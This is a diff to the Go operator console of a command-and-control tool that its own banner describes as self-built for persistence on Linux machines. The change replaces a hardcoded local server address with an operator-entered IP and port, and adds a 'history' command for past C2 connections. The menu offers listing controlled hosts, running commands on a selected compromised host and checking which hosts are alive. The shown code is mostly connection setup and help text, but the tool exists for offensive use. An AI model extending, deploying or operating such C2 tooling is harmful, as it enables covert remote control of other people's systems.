@@ -20,7 +20,7 @@ var master string = ""  //声明聊天室的昵称
 func main() {
 	fmt.Println("")
 	fmt.Println("使用方法:  ")
-	fmt.Println("        1、随意先创建用户： Make a mastername:xxx")
+	fmt.Println("        1、先输入服务端ip和端口进行连接，然后随意先创建用户： Make a mastername:xxx")
 	fmt.Println("")
 
 	//fmt.Println("        2、展示c2：        shell>>show")
@@ -28,7 +28,14 @@ func main() {
 	fmt.Println("                                          一款专门用于linux维权的C2自研工具")
 	fmt.Println("                                          by  aufeng     v1.0")
 	fmt.Println("")
-	conn, err := net.Dial("tcp", "127.0.0.1:8888")  //打开监听端口
+	fmt.Println("连接服务器    输入示例  1.2.3.4:8888")
+	fmt.Println("               ↓")
+	fmt.Print("please enter : ")
+	scanner := bufio.NewScanner(os.Stdin)
+	scanner.Scan()
+	input := scanner.Text()
+	conn, err := net.Dial("tcp", input)  //打开监听端口
+	//conn, err := net.Dial("tcp", "192.168.126.1:8888")  //打开监听端口
 	if err != nil {
 		fmt.Println("conn fail...")
 	}
@@ -48,7 +55,8 @@ func main() {
 	fmt.Println("        2、展示c2：        shell>>show")
 	fmt.Println("        3、执行命令方法:   shell>>select|c2主机名字|命令")
 	fmt.Println("        4、检查存活:       shell>>checkalive")
-	fmt.Println("        5、帮助:           shell>>help")
+	fmt.Println("        5、帮助:               shell>>help")
+	fmt.Println("        6、查看历史c2连接记录:  shell>>history")
 
 	fmt.Println("")
 
@@ -76,6 +84,7 @@ func main() {
 				fmt.Println("        3、执行命令方法:   shell>>select|c2主机名字|命令")
 				fmt.Println("        4、检查存活:       shell>>checkalive")
 				fmt.Println("        5、帮助:           shell>>help")
+				fmt.Println("        6、查看历史c2连接记录:  shell>>history")
 				fmt.Println("")
 				fmt.Print("shell >> ")
 				continue
